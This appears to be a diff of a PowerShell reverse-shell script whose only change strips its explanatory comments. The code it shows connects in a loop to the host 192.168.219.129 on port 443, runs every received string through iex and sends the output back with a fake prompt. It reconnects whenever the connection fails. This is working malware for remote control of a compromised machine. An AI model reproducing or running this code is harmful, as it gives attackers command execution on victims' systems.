@@ -3,7 +3,6 @@ while (1 -eq 1)
     $ErrorActionPreference = 'Continue';
     try
     {
-        #attempt inital connection
         $client = New-Object System.Net.Sockets.TCPClient("192.168.219.129",443);
         $stream = $client.GetStream();
         [byte[]]$bytes = 0..255|%{0};
@@ -15,7 +14,6 @@ while (1 -eq 1)
             if($recdata.StartsWith("kill-link")){ cls; $client.Close(); exit;}
             try
             {
-                #attempt to execute the received command
                 $sendback = (iex $recdata 2>&1 | Out-String );
                 $sendback2  = $sendback + "PS " + (pwd).Path + "> ";
             }
@@ -31,7 +29,6 @@ while (1 -eq 1)
     }
     catch 
     {
-        #an initial connection error - close and wait 30 secs then retry
         if($client.Connected)
         {
             $client.Close();
